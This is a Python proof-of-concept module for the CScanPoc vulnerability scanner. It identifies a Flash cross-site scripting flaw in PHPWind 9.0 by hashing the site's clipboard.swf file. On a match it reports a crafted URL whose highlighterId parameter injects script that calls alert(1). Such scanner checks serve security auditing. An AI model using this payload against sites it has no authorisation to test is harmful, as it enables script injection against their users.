# coding: utf-8
import hashlib
import urllib.request
import urllib.error
import urllib.parse

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'PHPWind_0112'  # 平台漏洞编号，留空
    name = 'PHPWind 9.0 /res/js/dev/util_libs/syntaxHihglighter/scripts/clipboard.swf 跨站脚本'  # 漏洞名称
    level = VulnLevel.LOW  # 漏洞危害级别
    type = VulnType.XSS  # 漏洞类型
    disclosure_date = '2014-10-10'  # 漏洞公布时间
    desc = '''
    phpwind9.0 res/js/dev/util_libs/syntaxHihglighter/scripts/clipboard.swf文件存在FlashXss漏洞。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源http://www.wooyun.org/bugs/wooyun-2013-038433
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'PHPWind'  # 漏洞应用名称
    product_version = '9.0'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '51123689-c54d-4b19-a0f3-a704e57630ac'  # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            flash_md5 = "e971c772b2df839298a8f8f9451f1eda"
            verify_url = self.target + \
                "/res/js/dev/util_libs/syntaxHihglighter/scripts/clipboard.swf"
            request = urllib.request.Request(verify_url)
            response = urllib.request.urlopen(request)
            content = response.read()
            md5_value = hashlib.md5(content).hexdigest()
            if md5_value in flash_md5:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞;xss_url={xss_url}'.format(
                    target=self.target, name=self.vuln.name, xss_url=verify_url + '?highlighterId=bb2\\"))}catch(e){alert(1)}//'))

        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
